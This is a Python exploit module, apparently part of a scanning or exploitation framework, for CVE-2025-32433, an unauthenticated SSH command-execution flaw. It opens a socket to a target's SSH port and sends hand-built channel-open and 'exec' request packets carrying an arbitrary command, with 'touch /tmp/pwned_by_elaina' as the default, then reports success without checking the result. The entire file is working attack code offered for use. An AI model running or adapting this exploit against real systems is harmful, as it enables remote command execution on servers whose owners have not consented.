import socket
import struct
from module.other import Other

class CVE202532433Exploit:
    def __init__(self, args):
        self.target = args.target
        self.port = args.port or 22
        self.cmd = args.cmd or "touch /tmp/pwned_by_elaina"
        self.verbose = args.verbose
        self.module_name = "CVE-2025-32433"
        self.printer = Other()

    def create_payload(self):
        payload_channel_open = (
            b"\x5a"
            + struct.pack(">I", len(b"session")) + b"session"
            + struct.pack(">I", 0)
            + struct.pack(">I", 0x100000)
            + struct.pack(">I", 0x4000)
        )
        payload_channel_request = (
            b"\x62"
            + struct.pack(">I", 0)
            + struct.pack(">I", len(b"exec")) + b"exec"
            + struct.pack("?", False)
            + struct.pack(">I", len(self.cmd.encode())) + self.cmd.encode()
        )
        return payload_channel_open + payload_channel_request

    def run(self):
        try:
            s = socket.create_connection((self.target, self.port), timeout=5)
            banner = s.recv(1024)
            if self.verbose:
                print(f"[+] SSH Banner: {banner.decode(errors='ignore').strip()}")
            s.send(self.create_payload())
            s.close()
            colored = self.printer.color_text(self.module_name, "cyan")
            print(f"[+] [Module: {colored}] [Exploit Sent] [Target: {self.target}:{self.port}]")
            return {"cve": self.module_name, "target": self.target, "success": True}
        except Exception as e:
            return {"cve": self.module_name, "target": self.target, "success": False, "error": str(e)}

def scan(args=None):
    return CVE202532433Exploit(args).run()
